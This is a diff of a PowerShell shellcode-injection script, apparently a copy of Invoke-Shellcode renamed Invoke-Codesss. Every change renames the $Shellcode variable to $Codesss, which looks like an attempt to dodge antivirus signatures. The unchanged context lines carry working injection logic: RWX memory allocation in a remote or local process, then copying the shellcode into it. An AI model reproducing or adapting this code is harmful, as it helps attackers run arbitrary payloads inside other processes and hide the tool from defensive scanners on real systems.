@@ -10,7 +10,7 @@ function Invoke-Codesss
     [Parameter( ParameterSetName = 'RunLocal' )]
     [ValidateNotNullOrEmpty()]
     [Byte[]]
-    $Shellcode,
+    $Codesss,
     
     [Switch]
     $Force = $False
@@ -151,7 +151,7 @@ function Invoke-Codesss
                     Throw 'No shellcode was placed in the $Shellcode32 variable!'
                 }
                 
-                $Shellcode = $Shellcode32
+                $Codesss = $Shellcode32
                 Write-Verbose 'Injecting into a Wow64 process.'
                 Write-Verbose 'Using 32-bit shellcode.'
             }
@@ -162,7 +162,7 @@ function Invoke-Codesss
                     Throw 'No shellcode was placed in the $Shellcode64 variable!'
                 }
                 
-                $Shellcode = $Shellcode64
+                $Codesss = $Shellcode64
                 Write-Verbose 'Using 64-bit shellcode.'
             }
         }
@@ -173,12 +173,12 @@ function Invoke-Codesss
                 Throw 'No shellcode was placed in the $Shellcode32 variable!'
             }
             
-            $Shellcode = $Shellcode32
+            $Codesss = $Shellcode32
             Write-Verbose 'Using 32-bit shellcode.'
         }
 
         # Reserve and commit enough memory in remote process to hold the shellcode
-        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Codesss.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
         
         if (!$RemoteMemAddr)
         {
@@ -188,7 +188,7 @@ function Invoke-Codesss
         Write-Verbose "Shellcode memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"
 
         # Copy shellcode into the previously allocated memory
-        $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) | Out-Null
+        $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $Codesss, $Codesss.Length, [Ref] 0) | Out-Null
 
         # Get address of ExitThread function
         $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
@@ -244,7 +244,7 @@ function Invoke-Codesss
                 return
             }
             
-            $Shellcode = $Shellcode32
+            $Codesss = $Shellcode32
             Write-Verbose 'Using 32-bit shellcode.'
         }
         else
@@ -255,12 +255,12 @@ function Invoke-Codesss
                 return
             }
             
-            $Shellcode = $Shellcode64
+            $Codesss = $Shellcode64
             Write-Verbose 'Using 64-bit shellcode.'
         }
     
         # Allocate RWX memory for the shellcode
-        $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
+        $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Codesss.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
         if (!$BaseAddress)
         {
             Throw "Unable to allocate shellcode memory in PID: $ProcessID"
@@ -269,7 +269,7 @@ function Invoke-Codesss
         Write-Verbose "Shellcode memory reserved at 0x$($BaseAddress.ToString("X$([IntPtr]::Size*2)"))"
 
         # Copy shellcode to RWX buffer
-        [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $BaseAddress, $Shellcode.Length)
+        [System.Runtime.InteropServices.Marshal]::Copy($Codesss, 0, $BaseAddress, $Codesss.Length)
         
         # Get address of ExitThread function
         $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
